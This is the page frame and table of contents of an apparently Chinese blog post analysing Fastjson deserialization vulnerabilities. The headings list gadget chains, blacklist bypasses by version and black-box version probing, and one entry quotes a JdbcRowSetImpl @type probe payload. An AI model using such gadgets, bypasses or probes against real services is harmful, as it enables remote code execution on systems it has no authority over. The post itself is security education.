id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" alt="红十字会"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" alt="LOGO"/></a><div class="post-qr-code-desc">LOGO</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://blog.takake.com/posts/32163/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Fastjson安全漏洞分析&amp;url=https://blog.takake.com/posts/32163/&amp;pic=https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/t01d2db9ae92fa8184f.png?x-oss-process=style/img-to-webp" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.takake.com" target="_blank">高木のBlog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>代码审计<span class="tagsPageCount">15</span></a><a class="post-meta__box__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>网络安全<span class="tagsPageCount">10</span></a><a class="post-meta__box__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>反序列化<span class="tagsPageCount">4</span></a><a class="post-meta__box__tags" href="/tags/Fastjson/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Fastjson<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/JSON%E6%B3%A8%E5%85%A5/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>JSON注入<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/img/default_cover.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/28183/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">JNDI注入分析</div></div></a></div><div class="next-post pull-right"><a href="/posts/56723/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SSRF-Redis专题</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/posts/28183/" title="JNDI注入分析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-03-07</div><div class="title">JNDI注入分析</div></div></a></div><div><a href="/posts/17013/" title="PHP反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-03-15</div><div class="title">PHP反序列化</div></div></a></div><div><a href="/posts/49984/" title="Apachelog4j2-RCE-漏洞(CVE-2021-44228)"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/log4j.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-18</div><div class="title">Apachelog4j2-RCE-漏洞(CVE-2021-44228)</div></div></a></div><div><a href="/posts/26566/" title="JAVA反射"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/java_logo_icon_168609.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-01-30</div><div class="title">JAVA反射</div></div></a></div><div><a href="/posts/27647/" title="JAVA反序列化漏洞利用链之CC1-1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/java_logo_icon_168609.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-15</div><div class="title">JAVA反序列化漏洞利用链之CC1-1</div></div></a></div><div><a href="/posts/43454/" title="JAVA反序列化漏洞利用链之CC6"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/java_logo_icon_168609.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-01-23</div><div class="title">JAVA反序列化漏洞利用链之CC6</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://emotion.acs.pw/emotion/Heo-100/%E6%BB%91%E7%A8%BD.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">网络安全、开发、人工智能</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Takake</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/takakie" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/3494356843497618" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">防疫指南：菊花上插葱，新冠去无踪✌️</div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/645fa415e869402.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Fastjson%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">1.Fastjson分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-fastjson%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">1.1.fastjson常用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">1.2.调用流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CFastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.3.</span> <span class="toc-text">1.3.JAVA反序列化和FastJSON反序列化的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E5%93%AA%E4%BA%9BSetter%E5%92%8CGetter-isXxx%E6%96%B9%E6%B3%95%E4%BC%9A%E8%A2%AB%E6%89%A7%E8%A1%8C%EF%BC%9F"><span class="toc-number">1.4.</span> <span class="toc-text">1.4.哪些Setter和Getter&#x2F;isXxx方法会被执行？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Setter"><span class="toc-number">1.4.1.</span> <span class="toc-text">Setter()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getter-isXxxx"><span class="toc-number">1.4.2.</span> <span class="toc-text">Getter()&#x2F;isXxxx()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.5.</span> <span class="toc-text">1.5.注意事项</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E6%89%93V1-2-24"><span class="toc-number">2.</span> <span class="toc-text">2.打V1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-JdbcRowSetImpl"><span class="toc-number">2.1.</span> <span class="toc-text">2.1.JdbcRowSetImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1%E7%B1%BB%E5%88%86%E6%9E%90"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1类分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-2-POC%E5%88%86%E6%9E%90"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2.POC分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-3-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.3.流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-4-%E6%80%BB%E7%BB%93"><span class="toc-number">2.1.4.</span> <span class="toc-text">2.1.4.总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-5-%E6%80%9D%E8%80%83"><span class="toc-number">2.1.5.</span> <span class="toc-text">2.1.5.思考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-TemplatesImpl%EF%BC%88%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">2.2.TemplatesImpl（不出网利用）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-Becl-%EF%BC%88%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. Becl （不出网利用）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1.利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-2-%E7%B1%BB%E5%88%86%E6%9E%90"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2.类分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-3-PoC%E5%88%86%E6%9E%90"><span class="toc-number">2.3.3.</span> <span class="toc-text">2.3.3.PoC分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-4-%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.4.</span> <span class="toc-text">2.3.4.流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-C3P0-%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">2.4.C3P0 (不出网利用)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-1-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1.利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-1-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.1. 流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-2-PoC%E7%BC%96%E5%86%99"><span class="toc-number">2.4.3.</span> <span class="toc-text">2.4.2.PoC编写</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">3.</span> <span class="toc-text">3. 绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-1-2-47%E5%88%A9%E7%94%A8%E7%BC%93%E5%AD%98%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">3.1. 1.2.47利用缓存绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%A4%A9%E7%84%B6%E5%B1%9E%E6%80%A7"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">类加载的天然属性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-1-2-41-L-%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">3.2. 1.2.41 L&lt;类名&gt;;  绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-1-2-42-%E5%8F%8C%E5%86%99LL-%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.</span> <span class="toc-text">3.3. 1.2.42 双写LL&lt;类名&gt;;; 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-1-2-43-%E7%BB%95%E8%BF%87"><span class="toc-number">3.4.</span> <span class="toc-text">3.4. 1.2.43 [&lt;类名&gt; 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-1-2-68-%E7%BB%95%E8%BF%87"><span class="toc-number">3.5.</span> <span class="toc-text">3.5. 1.2.68 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-1-%E5%BD%93%E6%9C%AA%E4%B8%BB%E5%8A%A8%E5%BC%80%E5%90%AFautoType%E6%94%AF%E6%8C%81"><span class="toc-number">3.5.1.</span> <span class="toc-text">3.5.1.当未主动开启autoType支持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8JDK11%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">3.5.1.1.</span> <span class="toc-text">1.利用JDK11写文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8commons-io%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">3.5.1.2.</span> <span class="toc-text">2.利用commons-io写文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8commons-io%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">3.5.1.3.</span> <span class="toc-text">3.利用commons-io读文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-2-%E4%B8%BB%E5%8A%A8%E5%BC%80%E5%90%AFautoType%E6%94%AF%E6%8C%81"><span class="toc-number">3.5.2.</span> <span class="toc-text">3.5.2.主动开启autoType支持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-ShiroJNDI%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E8%B0%83%E7%94%A8"><span class="toc-number">3.5.2.1.</span> <span class="toc-text">1.ShiroJNDI远程对象调用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-1-2-76-1-2-80%E7%BB%95%E8%BF%87"><span class="toc-number">3.6.</span> <span class="toc-text">3.6. 1.2.76 - 1.2.80绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-1-groovy%E9%93%BE"><span class="toc-number">3.6.1.</span> <span class="toc-text">3.6.1. groovy链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-2-1-2-80%E7%9A%84%E5%85%B6%E4%BB%96%E9%BB%98%E8%AE%A4%E5%85%B3%E9%97%ADautoType%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.6.2.</span> <span class="toc-text">3.6.2. 1.2.80的其他默认关闭autoType利用方式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1%E9%98%B6%E6%AE%B5"><span class="toc-number">4.</span> <span class="toc-text">4. 防御阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88%E6%BC%94%E8%BF%9B"><span class="toc-number">4.1.</span> <span class="toc-text">4.1.防御方案演进</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E6%BC%94%E5%8F%98%E6%80%BB%E8%A7%88"><span class="toc-number">4.1.1.</span> <span class="toc-text">版本防御机制演变总览</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E9%98%B6%E6%AE%B5%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E"><span class="toc-number">4.1.2.</span> <span class="toc-text">各阶段详细说明</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%97%A0%E9%99%90%E5%88%B6%E9%98%B6%E6%AE%B5%EF%BC%88%E2%89%A41-2-24%EF%BC%89"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">1. 无限制阶段（≤1.2.24）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%BB%91%E5%90%8D%E5%8D%95%E9%98%B6%E6%AE%B5%EF%BC%881-2-25-1-2-47%EF%BC%89"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">2. 黑名单阶段（1.2.25~1.2.47）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%99%BD%E5%90%8D%E5%8D%95%E4%BC%98%E5%85%88%E9%98%B6%E6%AE%B5%EF%BC%881-2-48-1-2-67%EF%BC%89"><span class="toc-number">4.1.2.3.</span> <span class="toc-text">3. 白名单优先阶段（1.2.48~1.2.67）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%A2%9E%E5%BC%BA%E7%99%BD%E5%90%8D%E5%8D%95%E9%98%B6%E6%AE%B5%EF%BC%881-2-68-1-2-82%EF%BC%89"><span class="toc-number">4.1.2.4.</span> <span class="toc-text">4. 增强白名单阶段（1.2.68~1.2.82）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-SafeMode-%E9%98%B6%E6%AE%B5%EF%BC%881-2-83-%EF%BC%89"><span class="toc-number">4.1.2.5.</span> <span class="toc-text">5. SafeMode 阶段（1.2.83+）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%89%88%E6%9C%AC%E5%AF%B9%E6%AF%94%E8%A1%A8"><span class="toc-number">4.1.3.</span> <span class="toc-text">关键版本对比表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B"><span class="toc-number">5.</span> <span class="toc-text">5.黑盒测试中的版本探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%88%96%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E4%B8%AD%EF%BC%8C%E6%8E%A2%E6%B5%8B%E7%9B%AE%E6%A0%87%E4%BD%BF%E7%94%A8%E7%9A%84-Fastjson-%E7%89%88%E6%9C%AC-%E6%98%AF%E8%AF%84%E4%BC%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%A3%8E%E9%99%A9%E7%9A%84%E5%85%B3%E9%94%AE%E6%AD%A5%E9%AA%A4%E3%80%82%E4%BB%A5%E4%B8%8B%E6%98%AF%E5%9C%A8%E9%BB%91%E7%9B%92%E7%8E%AF%E5%A2%83%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8E%A2%E6%B5%8B%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B6%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">5.1.</span> <span class="toc-text">  在渗透测试或安全评估中，探测目标使用的 Fastjson 版本 是评估反序列化漏洞风险的关键步骤。以下是在黑盒环境中常用的探测方法及其原理：
  </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E8%BF%87%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB"><span class="toc-number">5.1.1.</span> <span class="toc-text">1. 通过报错信息特征识别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8AutoCloseable%E5%92%8C%E5%BC%82%E5%B8%B8JSON%E6%8E%A5%E5%8F%A3"><span class="toc-number">5.1.1.1.</span> <span class="toc-text">(1) 利用AutoCloseable和异常JSON接口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8-type-%E5%8F%82%E6%95%B0%E8%A7%A6%E5%8F%91%E9%BB%91%E5%90%8D%E5%8D%95%E6%8B%A6%E6%88%AA-Payload%EF%BC%9A-%E7%89%88%E6%9C%AC%E7%89%B9%E5%BE%81%EF%BC%9A-1-2-25-1-2-47%EF%BC%9A%E8%BF%94%E5%9B%9E-autoType-is-not-support%EF%BC%8C%E4%BD%86%E5%8F%AF%E8%83%BD%E6%9A%B4%E9%9C%B2%E9%BB%91%E5%90%8D%E5%8D%95%E6%9C%BA%E5%88%B6%E3%80%82-1-2-48-%EF%BC%9A%E8%BF%94%E5%9B%9E%E6%9B%B4%E5%85%B7%E4%BD%93%E7%9A%84%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%EF%BC%88%E5%A6%82-autoType-is-not-support-java-lang-AutoCloseable%EF%BC%89%E3%80%82"><span class="toc-number">5.2.</span> <span class="toc-text">    #### (2) 利用 @type 参数触发黑名单拦截  - Payload：    1{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}  - 版本特征：    - 1.2.25~1.2.47：返回 autoType is not support，但可能暴露黑名单机制。    - **1.2.48+**：返回更具体的错误信息（如 autoType is not support. java.lang.AutoCloseable）。
